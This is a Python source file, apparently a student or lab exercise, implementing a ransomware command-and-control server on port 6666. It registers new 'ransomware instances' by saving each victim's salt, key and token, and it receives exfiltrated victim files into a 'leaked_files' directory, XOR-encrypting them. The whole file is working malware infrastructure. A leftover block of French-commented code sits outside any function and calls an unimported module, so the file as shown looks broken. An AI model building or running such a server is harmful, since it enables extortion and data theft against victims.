import base64
from hashlib import sha256
from http.server import HTTPServer
import os
from xorcrypt import xorfile
from pathlib import Path
from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    #def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        #return {"status":"KO"}


    def post_new(self, path:str, params:dict, body:dict) -> dict:
        # used to register new ransomware instance
        # debug logging of all function parameters
        #self._log.info(path)
        #self._log.info(params)
        #self._log.info(body)
        # local handling of function parameters/data
        # The directory label is passed as a url parameter (hash of the token)
        label = params['label']
        # salt, key and token are retrieved from the body and saved locally
        salt = body['salt']
        key = body['key']
        token = body['token']

        # forging the new file path at /root/CNC/{token_hashed_as_hex}
        new_path = f"{CNC.ROOT_PATH}/{label}"

        # if Path(new_path).exists():
        #     raise FileExistsError

        # creating the new directory using an equivalent of `mkdir -p` (error if the folder already exists)
        Path(new_path).mkdir(parents=True, exist_ok=False)
        # writing data to separate files
        self.save_b64(label, salt, 'salt.bin')
        self.save_b64(label, key, 'key.bin')
        self.save_b64(label, token, 'token.bin')

        return {"status":"OK"}

    def post_file(self, path: str, params: dict, body: dict) -> dict:
        self._log.debug(path)
        self._log.debug(params)
        self._log.debug(body)

        label = params['label']
        file_name = body['file_name']
        file_data = body['file_data']
        file_data = base64.b64decode(file_data)

        key_path = f"{CNC.ROOT_PATH}/{label}/key.bin"
        new_path = f"{CNC.ROOT_PATH}/{label}/leaked_files"
        file_path = f"{new_path}/{file_name}"
        
        if not Path(new_path).exists():
            Path(new_path).mkdir(parents=True, exist_ok=False)

        with open(key_path, 'rb') as key_file:
            key = key_file.read()
            self._log.debug(key)

        # file_path = f"{new_path}/{file_name}.bin"
        with open(file_path, "wb") as data_file:
            # bin_data is written into data_file
            data_file.write(file_data)

        xorfile(file_path, key)

        return {"status":"OK"}


    #def post_new(self, path: str, params: dict, body: dict) -> dict:
        # Assurez-vous que le chemin de base existe
        if not os.path.exists(self.ROOT_PATH):
            os.makedirs(self.ROOT_PATH)

        # Récupérer le token depuis les paramètres
        token = params.get('token')

        if token is not None:
            # Créer un répertoire basé sur le hachage (SHA-256) du token
            token_hash = hashlib.sha256(token.encode()).hexdigest()
            dir_path = os.path.join(self.ROOT_PATH, token_hash)

            # Assurez-vous que le répertoire du token existe
            if not os.path.exists(dir_path):
                os.makedirs(dir_path)

            # Stocker le sel et la clé dans des fichiers
            salt = body.get('salt')
            key = body.get('key')

            if salt is not None and key is not None:
                salt_file_path = os.path.join(dir_path, 'salt.bin')
                key_file_path = os.path.join(dir_path, 'key.bin')

                with open(salt_file_path, 'wb') as salt_file:
                    salt_file.write(base64.b64decode(salt))

                with open(key_file_path, 'wb') as key_file:
                    key_file.write(base64.b64decode(key))

                return {'message': f"token {token_hash} enregistré."}
            else:
                return {'error': 'salt et key manquants.'}
        else:
            return {'error': 'Le token manquant .'}
    

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()